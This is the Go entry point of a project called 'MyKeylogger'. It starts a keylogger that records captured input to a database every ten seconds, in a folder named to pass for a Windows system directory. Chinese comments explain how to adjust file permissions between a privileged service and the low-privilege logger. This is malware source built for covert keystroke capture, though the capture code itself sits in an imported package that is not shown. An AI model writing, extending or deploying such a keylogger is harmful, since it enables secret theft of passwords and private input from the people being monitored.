package main

import (
	keylogger2 "MyKeylogger/keylogger"
	"MyKeylogger/utilities"
	"path/filepath"
	"time"
)

const (
	DB  = "xxx.db"  //注意这两个文件的权限，因为其创建是由Service完成的，即高权限，而该keylogger则是低权限运行的，需要修改这两个文件的权限
	LOG = "log.log" //注意这两个文件的权限，因为其创建是由Service完成的，即高权限，而该keylogger则是低权限运行的，需要修改这两个文件的权限
	//HOMEDIR  = "C:\\ProgramData"
	HOMEDIR  = "C:\\ProgramData\\Windows\\tmp"
	INTERVAL = 10 * time.Second
)

func init() {
	utilities.InitLog(filepath.Join(HOMEDIR, LOG))
}

func main() {
	keylogger := keylogger2.NewKeylogger(filepath.Join(HOMEDIR, DB), INTERVAL)
	keylogger.Start()
}
